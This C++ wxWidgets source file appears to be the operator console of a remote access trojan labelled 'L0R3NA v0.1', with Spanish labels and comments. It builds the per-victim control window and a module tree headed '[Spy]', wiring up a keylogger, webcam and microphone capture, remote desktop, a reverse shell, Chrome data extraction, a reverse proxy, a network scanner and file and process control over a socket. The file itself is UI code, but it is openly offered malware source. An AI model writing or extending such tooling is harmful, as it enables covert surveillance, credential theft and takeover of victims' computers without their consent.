#include "frame_client.hpp"
#include "frame_remote_desktop.hpp"
#include "panel_file_manager.hpp"
#include "panel_process_manager.hpp"
#include "panel_microfono.hpp"
#include "panel_reverse_shell.hpp"
#include "panel_transferencias.hpp"
#include "panel_keylogger.hpp"
#include "panel_camara.hpp"
#include "panel_wmanager.hpp"
#include "panel_info_chrome.hpp"
#include "panel_usuarios.hpp"
#include "panel_reverse_proxy.hpp"
#include "panel_escaner.hpp"
#include "panel_fun.hpp"
#include "server.hpp"
#include "misc.hpp"

extern Servidor* p_Servidor;
extern std::mutex vector_mutex;

wxBEGIN_EVENT_TABLE(FrameCliente, wxFrame)
    EVT_CLOSE(FrameCliente::OnClose)
    EVT_BUTTON(EnumFrameIDS::BTN_Keylogger, FrameCliente::OnButton)
    EVT_BUTTON(EnumFrameIDS::BTN_Adm_Ventanas, FrameCliente::OnButton)
    EVT_BUTTON(EnumFrameIDS::BTN_Adm_Procesos, FrameCliente::OnButton)
    EVT_BUTTON(EnumFrameIDS::BTN_Informacion, FrameCliente::OnButton)
    EVT_BUTTON(EnumFrameIDS::BTN_Escaner, FrameCliente::OnButton)
    EVT_BUTTON(EnumFrameIDS::BTN_Remote_Desktop, FrameCliente::OnButton)
    EVT_BUTTON(EnumFrameIDS::BTN_Proxy_Iniciar, FrameCliente::OnButton)
    EVT_BUTTON(EnumFrameIDS::BTN_Proxy_Detener, FrameCliente::OnButton)
    EVT_BUTTON(EnumFrameIDS::BTN_Limpiar_Log, FrameCliente::OnButton)
    EVT_AUINOTEBOOK_PAGE_CLOSE(wxID_ANY, FrameCliente::OnClosePage)
wxEND_EVENT_TABLE()

wxBEGIN_EVENT_TABLE(MyTreeCtrl, wxTreeCtrl)
    EVT_TREE_ITEM_ACTIVATED(EnumIDS::TreeCtrl_ID, MyTreeCtrl::OnItemActivated)
wxEND_EVENT_TABLE()

FrameCliente::FrameCliente(SOCKET _sckSocket, std::string _strID, std::string _strIP)
    :wxFrame(nullptr, EnumIDS::ID_Panel_Cliente, _strID, wxDefaultPosition, wxSize(WIN_WIDTH, WIN_HEIGHT), wxDEFAULT_FRAME_STYLE & ~(wxRESIZE_BORDER | wxMAXIMIZE_BOX)) {
    
    wxString strTitle = "[";
    strTitle.append(_strID.c_str());
    strTitle.append("] - Admin");
    this->SetTitle(strTitle);

    this->sckCliente = _sckSocket;

    //////////////////////////////////////////////////
    //Administrador de archivos
    //////////////////////////////////////////////////
    wxPanel* pnl_AdminArchivos = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
    wxStaticBoxSizer* box_admin = new wxStaticBoxSizer(wxVERTICAL, pnl_AdminArchivos, "Administrador de archivos");

    //pnl_AdminArchivos->SetBackgroundColour(wxColour(100, 100, 100));
    
    box_admin->Add(new panelFileManager(pnl_AdminArchivos, this->sckCliente, _strID, _strIP), 0, wxALL | wxEXPAND);
    
    pnl_AdminArchivos->SetSizer(box_admin);
    //////////////////////////////////////////////////
    //////////////////////////////////////////////////

    
    //////////////////////////////////////////////////
    //Panel Monitoreo
    //////////////////////////////////////////////////
    wxPanel* pnl_Monitoreo = new wxPanel(this, wxID_ANY, wxDefaultPosition);
    wxStaticBoxSizer* box_monitoreo = new wxStaticBoxSizer(wxVERTICAL, pnl_Monitoreo, "Monitoreo");

    wxBoxSizer* box_btns_2 = new wxBoxSizer(wxHORIZONTAL);
    wxButton* btn_Keylogger = new wxButton(pnl_Monitoreo, EnumFrameIDS::BTN_Keylogger, "Keylogger");
    //btn_Keylogger->SetBitmap(wxBitmap(wxT("./keylogger.png"), wxBITMAP_TYPE_PNG));
   

    wxButton* btn_Camara = new wxButton(pnl_Monitoreo, EnumFrameIDS::BTN_Camara, "Camara");
    //btn_Camara->SetBitmap(wxBitmap(wxT("./webcam.png"), wxBITMAP_TYPE_PNG));
    
    box_btns_2->Add(btn_Keylogger, 1, wxALL | wxEXPAND);
    box_btns_2->Add(btn_Camara, 1, wxALL | wxEXPAND);

    box_monitoreo->Add(new panelMicrophone(pnl_Monitoreo, this->sckCliente), 1, wxALL | wxEXPAND);
    box_monitoreo->AddSpacer(5);
    box_monitoreo->Add(box_btns_2, 1, wxALL | wxEXPAND);

    pnl_Monitoreo->SetSizer(box_monitoreo);
    //////////////////////////////////////////////////
    //////////////////////////////////////////////////



    //////////////////////////////////////////////////
    //Botones para lanzar modulos
    //////////////////////////////////////////////////
    wxPanel* pnl_Mods = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxSize(275, wxDefaultSize.GetHeight()));
    wxStaticBoxSizer* box_mod = new wxStaticBoxSizer(wxVERTICAL, pnl_Mods, "Modulos");

    //pnl_Mods->SetBackgroundColour(wxColour(50, 50, 50));

    wxButton* btn_AdmVentanas = new wxButton(pnl_Mods, EnumFrameIDS::BTN_Adm_Ventanas, "Adm. Ventanas");
    wxButton* btn_EscanerRed = new wxButton(pnl_Mods, EnumFrameIDS::BTN_Escaner, "Escaner de Red");
    //btn_EscanerRed->SetBitmap(wxBitmap(wxT("./scan.png"), wxBITMAP_TYPE_PNG));
    wxButton* btn_AdmProcesos = new wxButton(pnl_Mods, EnumFrameIDS::BTN_Adm_Procesos, "Adm. Procesos");
    wxButton* btn_RemoteDesk = new wxButton(pnl_Mods, EnumFrameIDS::BTN_Remote_Desktop, "Escritorio Remoto");
    wxButton* btn_Informacion = new wxButton(pnl_Mods, EnumFrameIDS::BTN_Informacion, "Informacion");
    wxButton* btn_Bromas = new wxButton(pnl_Mods, EnumFrameIDS::BTN_Fun, "Bromas");
    //btn_Bromas->SetBitmap(wxBitmap(wxT("./prank.png"), wxBITMAP_TYPE_PNG));

    wxGridSizer* btnGrid = new wxGridSizer(3, 2, 5, 5);
    btnGrid->Add(btn_AdmVentanas, 1, wxALL | wxEXPAND);
    btnGrid->Add(btn_EscanerRed, 1, wxALL | wxEXPAND);
    btnGrid->Add(btn_AdmProcesos, 1, wxALL | wxEXPAND);
    btnGrid->Add(btn_RemoteDesk, 1, wxALL | wxEXPAND);
    btnGrid->Add(btn_Informacion, 1, wxALL | wxEXPAND);
    btnGrid->Add(btn_Bromas, 1, wxALL | wxEXPAND);

    box_mod->Add(btnGrid, 0, wxALL | wxEXPAND);

    pnl_Mods->SetSizer(box_mod);
    //////////////////////////////////////////////////
    //////////////////////////////////////////////////



    //////////////////////////////////////////////////
    //proxy inversa
    //////////////////////////////////////////////////
    wxPanel* pnl_Proxy = new wxPanel(this, wxID_ANY, wxDefaultPosition);
    wxStaticBoxSizer* box_proxy = new wxStaticBoxSizer(wxVERTICAL, pnl_Proxy, "Proxy Inversa");

    //pnl_Proxy->SetBackgroundColour(wxColour(150, 150, 150));

    box_proxy->Add(new panelReverseProxy(pnl_Proxy, this->sckCliente), 1, wxALL | wxEXPAND);

    /*box_proxy->Add(new wxStaticText(pnl_Proxy, wxID_ANY, "Puerto local"), 0, wxALL | wxEXPAND);
    box_proxy->Add(new wxTextCtrl(pnl_Proxy, wxID_ANY, "8080"), 0, wxALL | wxEXPAND);
    box_proxy->Add(new wxButton(pnl_Proxy, EnumFrameIDS::BTN_Proxy_Iniciar, "Iniciar"), 0, wxALL | wxEXPAND);
    box_proxy->Add(new wxButton(pnl_Proxy, EnumFrameIDS::BTN_Proxy_Detener, "Detener"), 0, wxALL | wxEXPAND);*/

    pnl_Proxy->SetSizer(box_proxy);
    //////////////////////////////////////////////////
    //////////////////////////////////////////////////


    //////////////////////////////////////////////////
    // Panel lateral
    //////////////////////////////////////////////////
    wxPanel* pnl_maquina = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxSize(180, wxDefaultSize.GetHeight()));
    wxStaticBoxSizer* maquina_sizer = new wxStaticBoxSizer(wxVERTICAL, pnl_maquina, "Maquina");

    wxImage imgCPU("./intel.png", wxBITMAP_TYPE_PNG);
    wxBitmap bmpCPU;
    if (imgCPU.IsOk()) {
        imgCPU.Rescale(64, 64, wxIMAGE_QUALITY_HIGH);
        bmpCPU = wxBitmap(imgCPU);
    }

    wxStaticBitmap* bmp = new wxStaticBitmap(pnl_maquina, wxID_ANY, bmpCPU);

    //pnl_maquina->SetBackgroundColour(wxColor(10, 12, 34));

    wxFlexGridSizer* lblGrid = new wxFlexGridSizer(7, 2, 1, 1);

    wxFont font(7, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_THIN);
    wxFont font2(7, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_SEMIBOLD);


    wxStaticText* lblOS = new wxStaticText(pnl_maquina, wxID_ANY, "Windows", wxDefaultPosition, wxDefaultSize);
    lblOS->SetFont(font);

    wxStaticText* lblUser = new wxStaticText(pnl_maquina, wxID_ANY, "eW1n", wxDefaultPosition, wxDefaultSize);
    lblUser->SetFont(font);


    wxStaticText* lblCPU = new wxStaticText(pnl_maquina, wxID_ANY, "Intel Tanuki", wxDefaultPosition, wxDefaultSize);
    lblCPU->SetFont(font);

    wxStaticText* lblRam = new wxStaticText(pnl_maquina, wxID_ANY, "8 GB", wxDefaultPosition, wxDefaultSize);
    lblRam->SetFont(font);

    wxStaticText* lblIPlocal = new wxStaticText(pnl_maquina, wxID_ANY, "192.168.0.2", wxDefaultPosition, wxDefaultSize);
    lblIPlocal->SetFont(font);

    wxStaticText* lblIPExterna = new wxStaticText(pnl_maquina, wxID_ANY, "172.92.65.88", wxDefaultPosition, wxDefaultSize);
    lblIPExterna->SetFont(font);

    wxStaticText* lblestado = new wxStaticText(pnl_maquina, wxID_ANY, "Conectado", wxDefaultPosition, wxDefaultSize);
    lblestado->SetFont(font);

    wxStaticText* _lblOS = new wxStaticText(pnl_maquina, wxID_ANY, "OS:", wxDefaultPosition, wxDefaultSize);
    _lblOS->SetFont(font2);

    wxStaticText* _lblUser = new wxStaticText(pnl_maquina, wxID_ANY, "Usuario:", wxDefaultPosition, wxDefaultSize);
    _lblUser->SetFont(font2);

    wxStaticText* _lblCPU = new wxStaticText(pnl_maquina, wxID_ANY, "Procesador:", wxDefaultPosition, wxDefaultSize);
    _lblCPU->SetFont(font2);

    wxStaticText* _lblRam = new wxStaticText(pnl_maquina, wxID_ANY, "RAM:", wxDefaultPosition, wxDefaultSize);
    _lblRam->SetFont(font2);

    wxStaticText* _lblIPlocal = new wxStaticText(pnl_maquina, wxID_ANY, "IP Interna:", wxDefaultPosition, wxDefaultSize);
    _lblIPlocal->SetFont(font2);

    wxStaticText* _lblIPExterna = new wxStaticText(pnl_maquina, wxID_ANY, "IP Externa:", wxDefaultPosition, wxDefaultSize);
    _lblIPExterna->SetFont(font2);

    wxStaticText* _lblestado = new wxStaticText(pnl_maquina, wxID_ANY, "Estado:", wxDefaultPosition, wxDefaultSize);
    _lblestado->SetFont(font2);

    lblGrid->Add(_lblOS, 0);
    lblGrid->Add(lblOS, 1, wxALL | wxEXPAND);

    lblGrid->Add(_lblUser, 0);
    lblGrid->Add(lblUser, 0, wxALL | wxEXPAND);

    lblGrid->Add(_lblCPU, 0);
    lblGrid->Add(lblCPU, 1, wxALL | wxEXPAND);

    lblGrid->Add(_lblRam, 0);
    lblGrid->Add(lblRam, 1, wxALL | wxEXPAND);

    lblGrid->Add(_lblIPlocal, 0);
    lblGrid->Add(lblIPlocal, 1, wxALL | wxEXPAND);

    lblGrid->Add(_lblIPExterna, 0);
    lblGrid->Add(lblIPExterna, 1, wxALL | wxEXPAND);

    lblGrid->Add(_lblestado, 0);
    lblGrid->Add(lblestado, 1, wxALL | wxEXPAND);

    maquina_sizer->Add(bmp, 0, wxALIGN_CENTER);
    maquina_sizer->Add(lblGrid, 0, wxALL | wxEXPAND);

    pnl_maquina->SetSizer(maquina_sizer);

    //////////////////////////////////////////////////
    //Log remoto
    //////////////////////////////////////////////////

    wxPanel* pnl_LogRemoto = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
    wxStaticBoxSizer* log_sizer = new wxStaticBoxSizer(wxVERTICAL, pnl_LogRemoto, "Log remoto");

    //pnl_LogRemoto->SetBackgroundColour(wxColor(30, 22, 123));

    wxTextCtrl* txtLog = new wxTextCtrl(pnl_LogRemoto, wxID_ANY, "Happy Hacking!!!", wxDefaultPosition, wxSize(wxDefaultSize.GetWidth(), 150), wxTE_MULTILINE | wxTE_READONLY | wxTE_WORDWRAP);
    
    log_sizer->Add(txtLog, 0, wxALL | wxEXPAND);
    log_sizer->AddSpacer(5);
    log_sizer->Add(new wxButton(pnl_LogRemoto, EnumFrameIDS::BTN_Limpiar_Log, "Limpiar log"), 0, wxALL | wxEXPAND);

    pnl_LogRemoto->SetSizer(log_sizer);

    //////////////////////////////////////////////////
    //////////////////////////////////////////////////

    wxBoxSizer* side_panel_sizer = new wxBoxSizer(wxVERTICAL);
    side_panel_sizer->Add(pnl_maquina, 0, wxALL | wxEXPAND);
    //side_panel_sizer->AddSpacer(5);
    side_panel_sizer->Add(pnl_LogRemoto, 0, wxALL | wxEXPAND);

    wxBoxSizer* all_mods = new wxBoxSizer(wxHORIZONTAL);
    all_mods->Add(pnl_Monitoreo, 1, wxALL | wxEXPAND);
    all_mods->AddSpacer(10);
    all_mods->Add(pnl_Mods, 1, wxALL | wxEXPAND);
    all_mods->AddSpacer(10);
    all_mods->Add(pnl_Proxy, 0, wxALL | wxEXPAND);

    wxBoxSizer* dashboard_sizer = new wxBoxSizer(wxVERTICAL);
    dashboard_sizer->Add(pnl_AdminArchivos, 0, wxALL | wxEXPAND);
    dashboard_sizer->AddSpacer(10);
    dashboard_sizer->Add(all_mods);

    wxPanel* top_Panel = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxSize(WIN_WIDTH, (WIN_HEIGHT / 2)));
    wxBoxSizer* top_sizer = new wxBoxSizer(wxHORIZONTAL);
    top_sizer->Add(dashboard_sizer, 0, wxALL | wxEXPAND);
    top_sizer->AddSpacer(10);
    top_sizer->Add(side_panel_sizer);


    ////////////////////////////////////////////////////
    // Panel inferior reverse shell
    ////////////////////////////////////////////////////
    wxPanel* bottom_Panel = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxSize(WIN_WIDTH, (WIN_HEIGHT / 3)));
    
    wxStaticBoxSizer* bottom_sizer = new wxStaticBoxSizer(wxVERTICAL, bottom_Panel, "Shell Inversa");

    this->panelShell = new panelReverseShell(bottom_Panel, this->sckCliente);

    bottom_sizer->Add(this->panelShell, 1, wxALL | wxEXPAND);

    bottom_Panel->SetSizer(bottom_sizer);

    ////////////////////////////////////////////////////
    ////////////////////////////////////////////////////

    //Main Sizer
    wxBoxSizer* main_sizer = new wxBoxSizer(wxVERTICAL);
    main_sizer->Add(top_sizer, 0, wxALL | wxEXPAND);
    main_sizer->AddSpacer(5);
    main_sizer->Add(bottom_Panel, 0, wxALL | wxEXPAND);

    this->SetSizer(main_sizer);
}


FrameCliente::FrameCliente(std::string strID, SOCKET sckID, std::string strIP)
    : wxFrame(nullptr, EnumIDS::ID_Panel_Cliente, ":v", wxDefaultPosition, wxDefaultSize, wxDEFAULT_FRAME_STYLE, strID.substr(0, strID.find('/'))) {

    SetTransparent(245);

    this->sckCliente = sckID;
    int npos = strID.find('/', 0);
    this->strClienteID = strID.substr(0, npos);
    //this->strIP = strIP;

    wxString strTitle = "[";
    strTitle.append(strID.c_str());
    strTitle.append("] - Admin");
    this->SetTitle(strTitle);
    
    wxPanel* pnl_Left = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
    wxPanel* pnl_Right = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
    
    this->m_tree = new MyTreeCtrl(pnl_Left, EnumIDS::TreeCtrl_ID,wxDefaultPosition, wxSize(180, 450), this->strClienteID, strIP, sckID);
    
    wxTreeItemId rootC           = this->m_tree->AddRoot(                    wxT("CLI"));
    wxTreeItemId rootAdmin       = this->m_tree->AppendItem(rootC,       wxT("[Admin]"));
    wxTreeItemId rootSurveilance = this->m_tree->AppendItem(rootC,         wxT("[Spy]"));
    wxTreeItemId rootInformation = this->m_tree->AppendItem(rootC, wxT("[Informacion]"));
    wxTreeItemId rootNetwork     = this->m_tree->AppendItem(rootC,         wxT("[Red]"));
    wxTreeItemId rootMisc        = this->m_tree->AppendItem(rootC,        wxT("[Misc]"));

    this->m_tree->AppendItem(rootAdmin, wxT("Admin de Archivos"));
    this->m_tree->AppendItem(rootAdmin, wxT("Admin de Procesos"));
    this->m_tree->AppendItem(rootAdmin, wxT("Admin de Ventanas"));
    this->m_tree->AppendItem(rootAdmin,     wxT("Reverse Shell"));
    this->m_tree->AppendItem(rootAdmin,    wxT("Transferencias"));

    //this->m_tree->AppendItem(rootAdmin, wxT("Persistencia"));

    this->m_tree->AppendItem(rootSurveilance,         wxT("Keylogger"));
    this->m_tree->AppendItem(rootSurveilance,            wxT("Camara"));
    this->m_tree->AppendItem(rootSurveilance,         wxT("Microfono"));
    this->m_tree->AppendItem(rootSurveilance, wxT("Escritorio Remoto"));

    this->m_tree->AppendItem(rootInformation, wxT("Usuarios"));
    wxTreeItemId rootBrowsers = this->m_tree->AppendItem(rootInformation, wxT("Navegadores"));
    this->m_tree->AppendItem(rootBrowsers, wxT("Chrome"));

    this->m_tree->AppendItem(rootNetwork, wxT("Proxy Inversa"));
    this->m_tree->AppendItem(rootNetwork, wxT("Escaner de Red"));

    this->m_tree->AppendItem(rootMisc, wxT("Diversion"));

    //Sizer para hacer el treeview dinamico al hacer resize
    wxBoxSizer* pnl_left_Sizer = new wxBoxSizer(wxHORIZONTAL);
    pnl_left_Sizer->Add(this->m_tree, 1, wxEXPAND | wxALL, 2);
    pnl_Left->SetSizer(pnl_left_Sizer);
    //----------------------------------------------

    this->m_tree->p_Notebook = new wxAuiNotebook(pnl_Right, wxID_ANY, wxDefaultPosition, wxDefaultSize,
        wxAUI_NB_CLOSE_ON_ACTIVE_TAB | wxAUI_NB_DEFAULT_STYLE | wxAUI_NB_TAB_EXTERNAL_MOVE | wxNO_BORDER);

    //Sizer para el notebook del lado derecho
    wxBoxSizer* pnl_right_Sizer = new wxBoxSizer(wxHORIZONTAL);
    pnl_right_Sizer->Add(this->m_tree->p_Notebook, 1, wxEXPAND | wxALL, 2);
    pnl_Right->SetSizer(pnl_right_Sizer);
    //----------------------------------------------

    wxHtmlWindow* html = new wxHtmlWindow(this->m_tree->p_Notebook, wxID_ANY, wxDefaultPosition, wxSize(200, 200));
    wxString htmlsource = "<center><h2>L0R3NA v0.1</h2><br>#Honduras</center>";
    html->SetPage(htmlsource);
    html->SetSize(wxSize(200, 200));

    this->m_tree->p_Notebook->Freeze();
    this->m_tree->p_Notebook->AddPage(html, ":v", true);
    this->m_tree->p_Notebook->Thaw();
    
    wxBoxSizer* sizer = new wxBoxSizer(wxHORIZONTAL);

    sizer->Add(pnl_Left, 0, wxEXPAND | wxALL, 2);
    sizer->Add(pnl_Right, 1, wxEXPAND | wxALL, 2);
    
    this->SetSizerAndFit(sizer);

    SetClientSize(700, 450);


#ifdef DEBUG_DESIGN_LIMITS
    SetBackgroundColour(wxColour(255, 255, 255, 128)); // Establecer el color de fondo
    pnl_Left->SetBackgroundColour(wxColor(255, 0, 0));
    pnl_Right->SetBackgroundColour(wxColor(0, 255, 0));
    html->SetBackgroundColour(wxColor(0, 0, 255));
#endif
    
}

void FrameCliente::OnClosePage(wxAuiNotebookEvent& event) {
    int closedPage = event.GetSelection();
    wxString pageTitle = this->m_tree->p_Notebook->GetPageText(closedPage);
    if (pageTitle == "Reverse Shell") {
        //Enviar comando para cerrar shell al cerra la tab
        p_Servidor->cChunkSend(this->sckCliente, "exit\r\n", 6, 0, false, EnumComandos::Reverse_Shell_Command);
    }
    event.Skip();
}

void FrameCliente::OnClose(wxCloseEvent& event) {
    int iIndex = p_Servidor->IndexOf(this->strClienteID);

    //Talvez remplazar este por uno que cierre todos los modulos que estan corriendo?
    if (iIndex != -1) {
        p_Servidor->vc_Clientes[iIndex]->m_setFrameVisible(false);
        p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, EnumComandos::CLI_KSWITCH);
    }
    event.Skip();
}

void FrameCliente::OnButton(wxCommandEvent& event) {
    const int btnID = event.GetId();
    int iComando = -1;

    if (btnID == EnumFrameIDS::BTN_Keylogger) {
        panelKeylogger* panelKey = new panelKeylogger(this, this->sckCliente);
        panelKey->Show();
    } else if (btnID == EnumFrameIDS::BTN_Camara){
        panelCamara* panelCam = new panelCamara(this, this->sckCliente);
        panelCam->Show();
    } else if (btnID == EnumFrameIDS::BTN_Adm_Ventanas) {
        panelWManager* panelVentanas = new panelWManager(this, this->sckCliente);
        panelVentanas->Show();
    } else if (btnID == EnumFrameIDS::BTN_Adm_Procesos) {
        panelProcessManager* panelProcesos = new panelProcessManager(this, this->sckCliente);
        panelProcesos->Show();
    } else if (btnID == EnumFrameIDS::BTN_Informacion) {
        panelInfoChrome* panelInfo = new panelInfoChrome(this, this->sckCliente);
        panelInfo->Show();
    } else if (btnID == EnumFrameIDS::BTN_Escaner) {
        panelEscaner* panelScaner = new panelEscaner(this, this->sckCliente);
        panelScaner->Show();
    } else if (btnID == EnumFrameIDS::BTN_Remote_Desktop) {
        frameRemoteDesktop* frameRemote = new frameRemoteDesktop(this, this->sckCliente);
        frameRemote->Show();
    } else if (btnID == EnumFrameIDS::BTN_Fun) {
        panelFun* panelF = new panelFun(this, this->sckCliente);
        panelF->Show();
    }
    
}

//Al hacer doble click en uno de los modulos del panel izquierdo
void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
    wxTreeItemId itemID = event.GetItem();
    wxString wStr = GetItemText(itemID);
    
    bool isFound = false;
    //Si el panel/frame ya esta abierto solo hacer focus
    for (int i = 0; i < this->p_Notebook->GetPageCount(); i++) {
        if (this->p_Notebook->GetPageText(i) == wStr) {
            this->p_Notebook->GetPage(i)->SetFocus();
            isFound = true;
            break;
        }
    }
    //GetPageCount
    if (wStr[0] != '[' && isFound == false) {
        this->p_Notebook->Freeze();

        if (wStr == "Reverse Shell") {
            this->p_Notebook->AddPage(new panelReverseShell(this, this->sckCliente), wStr, true);
        } else if (wStr == "Admin de Archivos") {
            this->p_Notebook->AddPage(new panelFileManager(this, this->sckCliente, this->strClienteID, this->strClienteIP), wStr, true);
        } else if (wStr == "Admin de Procesos") {
            this->p_Notebook->AddPage(new panelProcessManager(this, this->sckCliente), wStr, true);
        } else if (wStr == "Keylogger") {
            this->p_Notebook->AddPage(new panelKeylogger(this, this->sckCliente), wStr, true);
        } else if (wStr == "Microfono") {
            this->p_Notebook->AddPage(new panelMicrophone(this,this->sckCliente), wStr, true);
        } else if (wStr == "Camara") {
            this->p_Notebook->AddPage(new panelCamara(this, this->sckCliente), wStr, true);
        } else if (wStr == "Escritorio Remoto") {
            frameRemoteDesktop* frm_temp = DBG_NEW frameRemoteDesktop(this, this->sckCliente);
            frm_temp->Show(true);
        } else if (wStr == "Transferencias") {
            this->p_Notebook->AddPage(new panelTransferencias(this, this->strClienteID), wStr, true);
        } else if (wStr == "Admin de Ventanas") {
            this->p_Notebook->AddPage(new panelWManager(this, this->sckCliente), wStr, true);
        } else if (wStr == "Chrome") {
            this->p_Notebook->AddPage(new panelInfoChrome(this, this->sckCliente), wStr, true);
        } else if (wStr == "Usuarios") {
            this->p_Notebook->AddPage(new panelUsuarios(this, this->sckCliente), wStr, true);
        } else if (wStr == "Proxy Inversa") {
            this->p_Notebook->AddPage(new panelReverseProxy(this, this->sckCliente), wStr, true);
        } else if (wStr == "Escaner de Red") {
            this->p_Notebook->AddPage(new panelEscaner(this, this->sckCliente), wStr, true);
        } else if (wStr == "Diversion") {
            this->p_Notebook->AddPage(new panelFun(this, this->sckCliente), wStr, true);
        }

        this->p_Notebook->Thaw();
    } 
}
